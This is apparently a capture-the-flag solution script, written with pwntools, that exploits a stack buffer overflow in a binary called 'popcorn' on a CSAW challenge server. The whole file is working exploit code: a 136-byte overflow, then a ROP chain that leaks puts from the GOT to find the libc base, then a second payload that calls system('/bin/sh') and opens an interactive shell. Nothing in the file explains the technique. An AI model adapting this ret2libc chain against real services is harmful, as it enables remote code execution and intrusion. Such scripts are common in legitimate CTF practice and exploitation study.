from pwn import *

e = ELF("./popcorn")
libc = ELF("./libc.so.6")

#p = process(e.path)
p = remote("pwn.chal.csaw.io", 1006)

p.sendline("A" * 128 + "A" * 8 + p64(0x4011eb) + p64(e.got["puts"]) + p64(e.symbols["puts"]) + p64(e.symbols["get_pop"]))

p.recvline()

base = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["puts"]
print("{:#x}".format(base))

p.sendline("A" * 128 + "A" * 8 + p64(0x4011eb) + p64(base + next(libc.search("/bin/sh"))) + p64(base + libc.symbols["system"]))

p.interactive()
